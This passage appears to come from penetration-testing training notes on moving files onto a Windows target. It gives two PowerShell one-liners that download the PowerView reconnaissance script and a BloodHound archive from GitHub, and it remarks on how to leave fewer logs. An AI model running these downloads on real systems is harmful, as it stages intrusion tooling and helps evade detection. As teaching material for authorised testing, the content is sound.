Keep in mind this is noisy because you will have web requests entering and leaving your network along with file reads and writes, so it `WILL` leave logs. If your transfers are done locally, only host to host, for example, you only leave logs on those hosts, which are a bit harder to sift through and leave less of a trace since we aren't writing ingress/egress logs at the customer boundary.
# PowerShell

#### Download to Host

##### Invoke-WebRequest

We can also use Invoke-WebRequest to download files from web servers on the local network or a network reachable from the Windows target.

```powershell-session
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```

##### Net.WebClient

```powershell-session
(New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")
```
